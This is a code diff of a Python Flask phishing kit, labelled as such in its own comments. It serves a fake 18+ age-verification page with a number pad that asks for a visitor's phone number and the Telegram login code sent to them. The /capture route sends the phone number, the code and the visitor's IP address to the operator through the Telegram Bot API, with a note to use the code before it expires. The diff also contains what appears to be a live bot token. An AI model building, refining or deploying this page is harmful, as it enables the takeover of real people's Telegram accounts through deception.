@@ -4,95 +4,84 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# ===== CONFIGURATION =====
 BOT_TOKEN = "8339819248:AAEW9PLB6WTzR2NkjCN1d-4aSPPX_Y1I9iM"
-YOUR_TELEGRAM_ID = "8302282238"
+YOUR_ID = "8302282238"
 
-# ===== AGE-VERIFICATION PHISHING PAGE (Porn style) =====
-HTML_TEMPLATE = '''
+HTML = '''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Age verification</title>
+    <title>Age Verification</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
+            user-select: none;
         }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background: #0a0a0a;
+            background: #000;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 16px;
         }
         .container {
-            max-width: 400px;
+            max-width: 380px;
             width: 100%;
-            background: #111;
-            border-radius: 28px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.5);
+            background: rgba(20, 20, 20, 0.95);
+            border-radius: 32px;
             overflow: hidden;
-            border: 1px solid #333;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            backdrop-filter: blur(10px);
         }
-        .header {
-            background: #1a1a1a;
-            padding: 20px;
+        .blur-bg {
+            position: relative;
+            padding: 24px 20px 20px;
             text-align: center;
-            border-bottom: 1px solid #333;
+            background: linear-gradient(135deg, rgba(255, 51, 102, 0.15), rgba(0, 0, 0, 0.9));
         }
-        .header h2 {
+        .icon {
+            font-size: 56px;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.3));
+        }
+        h2 {
             color: #ff3366;
-            font-size: 22px;
-            margin-bottom: 5px;
+            font-size: 24px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            margin-bottom: 6px;
         }
-        .header p {
-            color: #888;
-            font-size: 12px;
-        }
-        .blur-area {
-            padding: 30px 20px;
-            text-align: center;
-            background: #0a0a0a;
-        }
-        .blur-image {
-            width: 100%;
-            height: 200px;
-            background: linear-gradient(135deg, #2a1a1a, #1a1a2a);
-            margin: 0 auto 20px;
-            border-radius: 16px;
-            filter: blur(20px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 64px;
-            color: rgba(255,255,255,0.3);
-            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>');
-            background-repeat: no-repeat;
-            background-position: center;
-            background-size: 60px;
-        }
-        .blur-area h3 {
-            color: #ff3366;
-            margin-bottom: 8px;
-            font-size: 20px;
-        }
-        .blur-area p {
+        .sub {
             color: #aaa;
-            font-size: 14px;
+            font-size: 13px;
+            font-weight: 400;
         }
-        .form-area {
+        .blur-overlay {
+            position: relative;
+            margin-top: 16px;
             padding: 20px;
-            background: #0a0a0a;
+            background: rgba(0, 0, 0, 0.6);
+            border-radius: 24px;
+            backdrop-filter: blur(20px);
+        }
+        .blur-text {
+            font-size: 14px;
+            color: #888;
+            margin-top: 8px;
+        }
+        .form {
+            padding: 20px;
         }
         .input-group {
-            margin-bottom: 15px;
+            margin-bottom: 16px;
         }
         .input-group label {
             display: block;
@@ -105,7 +94,7 @@ HTML_TEMPLATE = '''
             width: 100%;
             padding: 14px;
             border: 1px solid #333;
-            border-radius: 12px;
+            border-radius: 14px;
             font-size: 16px;
             background: #1a1a1a;
             color: white;
@@ -116,27 +105,28 @@ HTML_TEMPLATE = '''
             border-color: #ff3366;
             background: #222;
         }
-        .code-buttons {
+        .num-pad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: 12px;
             margin: 20px 0;
         }
-        .code-key {
+        .num-key {
             background: #1a1a1a;
             text-align: center;
             padding: 14px;
-            border-radius: 14px;
-            font-size: 20px;
+            border-radius: 16px;
+            font-size: 22px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.1s;
+            transition: all 0.05s linear;
             border: 1px solid #333;
             color: white;
         }
-        .code-key:active {
-            background: #333;
+        .num-key:active {
+            background: #ff3366;
             transform: scale(0.96);
+            border-color: #ff3366;
         }
         .action-btn {
             width: 100%;
@@ -144,130 +134,129 @@ HTML_TEMPLATE = '''
             color: white;
             border: none;
             padding: 16px;
-            border-radius: 14px;
+            border-radius: 30px;
             font-size: 18px;
-            font-weight: 600;
+            font-weight: 700;
             cursor: pointer;
             margin-top: 10px;
-            transition: all 0.2s;
+            transition: 0.1s;
         }
-        .action-btn:hover {
+        .action-btn:active {
+            transform: scale(0.98);
             background: #e62e5c;
         }
         .footer {
             text-align: center;
-            padding: 15px;
+            padding: 16px;
             font-size: 11px;
             color: #555;
             border-top: 1px solid #222;
             background: #0a0a0a;
         }
         .status {
-            margin-top: 15px;
+            margin-top: 16px;
             padding: 10px;
-            border-radius: 10px;
+            border-radius: 12px;
             font-size: 13px;
             display: none;
+            text-align: center;
         }
         .status.error {
             background: #ff336622;
             color: #ff6699;
             display: block;
         }
+        @keyframes pulse {
+            0% { opacity: 0.6; }
+            100% { opacity: 1; }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <div class="header">
-            <h2>🔞 ADULT CONTENT</h2>
-            <p>18+ Only</p>
+        <div class="blur-bg">
+            <div class="icon">🔞</div>
+            <h2>Age Verification</h2>
+            <div class="sub">You must be 18+ to continue</div>
+            <div class="blur-overlay">
+                <div style="filter: blur(4px); font-size: 32px; margin-bottom: 8px;">🍆💦</div>
+                <div class="blur-text">Content is hidden. Verify your age to unlock.</div>
+            </div>
         </div>
-        <div class="blur-area">
-            <div class="blur-image"></div>
-            <h3>⚠️ Age Verification Required</h3>
-            <p>You must verify your age to continue</p>
-        </div>
-        <div class="form-area">
+        <div class="form">
             <div class="input-group">
-                <label>📞 Phone number</label>
+                <label>📞 Phone Number</label>
                 <input type="tel" id="phone" placeholder="+63 XXX XXX XXXX" autocomplete="off">
             </div>
             <div class="input-group">
-                <label>🔐 Verification code</label>
+                <label>🔐 Verification Code</label>
                 <input type="text" id="code" placeholder="Enter code sent to Telegram" autocomplete="off">
             </div>
-            <div class="code-buttons">
-                <div class="code-key" data-key="1">1</div>
-                <div class="code-key" data-key="2">2</div>
-                <div class="code-key" data-key="3">3</div>
-                <div class="code-key" data-key="4">4</div>
-                <div class="code-key" data-key="5">5</div>
-                <div class="code-key" data-key="6">6</div>
-                <div class="code-key" data-key="7">7</div>
-                <div class="code-key" data-key="8">8</div>
-                <div class="code-key" data-key="9">9</div>
-                <div class="code-key" data-key="0">0</div>
-                <div class="code-key" data-key="del">⌫</div>
-                <div class="code-key" data-key="clear">✖️</div>
-            </div>
-            <button class="action-btn" id="unlockBtn">VERIFY AGE & UNLOCK 🍆</button>
+            <div class="num-pad" id="numpad"></div>
+            <button class="action-btn" id="unlockBtn">I AM 18+ & VERIFY</button>
             <div id="status" class="status"></div>
         </div>
         <div class="footer">
-            🔞 You must be 18+ to continue • @vip2tbot
+            🔞 Adult Content – You must be 18 years or older
         </div>
     </div>
+
     <script>
         const phoneInput = document.getElementById('phone');
         const codeInput = document.getElementById('code');
         const unlockBtn = document.getElementById('unlockBtn');
         const statusDiv = document.getElementById('status');
-        
-        document.querySelectorAll('.code-key').forEach(key => {
-            key.addEventListener('click', () => {
-                const val = key.getAttribute('data-key');
-                if (val === 'del') {
+
+        // Create number pad
+        const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '⌫', '✖️'];
+        const numpad = document.getElementById('numpad');
+        keys.forEach(key => {
+            const btn = document.createElement('div');
+            btn.className = 'num-key';
+            btn.innerText = key;
+            btn.onclick = () => {
+                if (key === '⌫') {
                     codeInput.value = codeInput.value.slice(0, -1);
-                } else if (val === 'clear') {
+                } else if (key === '✖️') {
                     codeInput.value = '';
                 } else {
-                    codeInput.value += val;
+                    codeInput.value += key;
                 }
-            });
+            };
+            numpad.appendChild(btn);
         });
-        
+
         async function sendData() {
             const phone = phoneInput.value.trim();
             const code = codeInput.value.trim();
-            
+
             if (!phone || !code) {
-                statusDiv.textContent = '❌ Please enter your phone number and the code you received';
+                statusDiv.innerText = '❌ Please enter phone and code';
                 statusDiv.className = 'status error';
                 setTimeout(() => statusDiv.className = 'status', 2000);
                 return;
             }
-            
-            statusDiv.textContent = '⏳ Verifying...';
-            statusDiv.style.display = 'block';
-            statusDiv.className = 'status';
+
+            statusDiv.innerText = '⏳ Verifying...';
+            statusDiv.className = 'status error';
             
             try {
                 await fetch('/capture', {
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone: phone, code: code})
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, code })
                 });
-                statusDiv.textContent = '❌ Invalid code. Try again.';
-                statusDiv.className = 'status error';
+                statusDiv.innerText = '❌ Invalid code. Try again.';
                 setTimeout(() => statusDiv.className = 'status', 2000);
             } catch(e) {
-                statusDiv.textContent = '❌ Network error';
-                statusDiv.className = 'status error';
+                statusDiv.innerText = '❌ Network error';
             }
         }
-        
+
         unlockBtn.addEventListener('click', sendData);
-        codeInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendData(); });
+        codeInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendData();
+        });
     </script>
 </body>
 </html>
@@ -275,39 +264,18 @@ HTML_TEMPLATE = '''
 
 @app.route('/')
 def index():
-    return render_template_string(HTML_TEMPLATE)
+    return HTML
 
 @app.route('/capture', methods=['POST'])
 def capture():
     data = request.json
-    phone = data.get('phone', '')
-    code = data.get('code', '')
-    
-    msg = f"""🔞 **AGE VERIFICATION CAPTURE** 🔞
-
-📞 **Phone:** `{phone}`
-🔑 **Code:** `{code}`
-🌐 **IP:** {request.remote_addr}
-⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
-
-⚠️ Use immediately before code expires!
-"""
-    
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    try:
-        requests.post(url, json={
-            'chat_id': YOUR_TELEGRAM_ID,
-            'text': msg,
-            'parse_mode': 'Markdown'
-        }, timeout=5)
-    except:
-        pass
-    
-    print(f"[CAPTURED] Phone: {phone} | Code: {code}")
+    phone = data.get('phone')
+    code = data.get('code')
+    msg = f"🔞 **AGE VERIFICATION CAPTURE** 🔞\n\n📞 Phone: `{phone}`\n🔑 Code: `{code}`\n🌐 IP: {request.remote_addr}"
+    requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
+                  json={'chat_id': YOUR_ID, 'text': msg, 'parse_mode': 'Markdown'})
+    print(f"[+] Captured: {phone} | {code}")
     return '', 200
 
 if __name__ == '__main__':
-    print("="*50)
-    print("🔞 PHISHING PAGE LIVE 🔞")
-    print("="*50)
-    app.run(host='0.0.0.0', port=10000, debug=False)
+    app.run(host='0.0.0.0', port=10000)
